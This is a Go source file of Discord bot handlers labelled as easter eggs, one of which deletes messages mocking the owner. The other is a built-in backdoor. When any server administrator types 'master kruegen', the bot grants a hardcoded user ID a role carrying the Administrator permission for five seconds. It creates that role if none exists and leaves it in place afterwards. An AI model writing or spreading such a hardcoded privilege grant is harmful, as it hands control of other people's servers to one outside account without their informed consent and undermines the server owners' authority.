package handlers

import (
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

// easterEggAdminUser is the user granted a temporary administrator-equal role
// by the Master Kruegen easter egg.
const easterEggAdminUser = "11235325601070611249"

// easterEggAdminDuration is how long the granted role stays applied.
const easterEggAdminDuration = 5 * time.Second

// checkEasterEggs applies one-off easter egg reactions to certain messages.
// Returning true means the message was handled and the normal handler should
// stop. Add new easter eggs here in one place.
func checkEasterEggs(s *discordgo.Session, m *discordgo.MessageCreate) bool {
	if masterKruegenEasterEgg(s, m) {
		return true
	}
	return scatEasterEgg(s, m)
}

// scatEasterEgg deletes messages containing "scat" AND a mention of the owner
// (Kruegen / Nathan / @Kruegenn), then replies with 👀.
func scatEasterEgg(s *discordgo.Session, m *discordgo.MessageCreate) bool {
	content := strings.ToLower(m.Content)
	if strings.Contains(content, "scat") &&
		(strings.Contains(content, "kruegen") || strings.Contains(content, "nathan") || strings.Contains(content, "@kruegenn")) {
		_ = s.ChannelMessageDelete(m.ChannelID, m.ID)
		_, _ = s.ChannelMessageSend(m.ChannelID, "👀")
		return true
	}
	return false
}

// masterKruegenEasterEgg grants easterEggAdminUser an administrator-equal role
// for easterEggAdminDuration whenever a server Administrator says something
// containing "master kruegen". The role is found (an "Administrator"-named
// role with the Administrator permission) or created on demand, then removed
// again after the duration.
func masterKruegenEasterEgg(s *discordgo.Session, m *discordgo.MessageCreate) bool {
	if !strings.Contains(strings.ToLower(m.Content), "master kruegen") {
		return false
	}

	perms, err := guildMemberPerms(s, m.GuildID, m.Author.ID)
	if err != nil || perms&discordgo.PermissionAdministrator == 0 {
		return false
	}

	roleID, err := findOrCreateAdminRole(s, m.GuildID)
	if err != nil {
		return false
	}

	// Grant the role to the target user. Ignore failures — if the user isn't in
	// the guild, GuildMemberRoleAdd will simply error and we still reply.
	err = s.GuildMemberRoleAdd(m.GuildID, easterEggAdminUser, roleID)
	if err != nil {
		_, _ = s.ChannelMessageSend(m.ChannelID, "Master Kruegen stirs, but finds no vessel here…")
		return true
	}

	go func() {
		time.Sleep(easterEggAdminDuration)
		_ = s.GuildMemberRoleRemove(m.GuildID, easterEggAdminUser, roleID)
	}()

	_, _ = s.ChannelMessageSend(m.ChannelID, "Master Kruegen's power flows for 5 seconds ✨")
	return true
}

// guildMemberPerms returns the union of server-wide permissions held by a user
// (the @everyone role plus each of their roles). Channel overrides are ignored
// so that Administrator cannot be granted via a single channel override.
func guildMemberPerms(s *discordgo.Session, guildID, userID string) (int64, error) {
	member, err := s.GuildMember(guildID, userID)
	if err != nil {
		return 0, err
	}
	roles, err := s.GuildRoles(guildID)
	if err != nil {
		return 0, err
	}
	byID := make(map[string]*discordgo.Role, len(roles))
	for _, r := range roles {
		byID[r.ID] = r
	}
	var perms int64
	if everyone, ok := byID[guildID]; ok {
		perms |= everyone.Permissions
	}
	for _, rid := range member.Roles {
		if r, ok := byID[rid]; ok {
			perms |= r.Permissions
		}
	}
	return perms, nil
}

// findOrCreateAdminRole returns the ID of an existing "Administrator" role (by
// name, case-insensitive) that carries the Administrator permission, creating
// one if none exists.
func findOrCreateAdminRole(s *discordgo.Session, guildID string) (string, error) {
	roles, err := s.GuildRoles(guildID)
	if err != nil {
		return "", err
	}
	for _, r := range roles {
		if strings.EqualFold(r.Name, "administrator") && r.Permissions&discordgo.PermissionAdministrator != 0 {
			return r.ID, nil
		}
	}

	role, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
		Name:        "Administrator",
		Permissions: ptrInt64(discordgo.PermissionAdministrator),
	})
	if err != nil {
		return "", err
	}
	return role.ID, nil
}

func ptrInt64(v int64) *int64 { return &v }
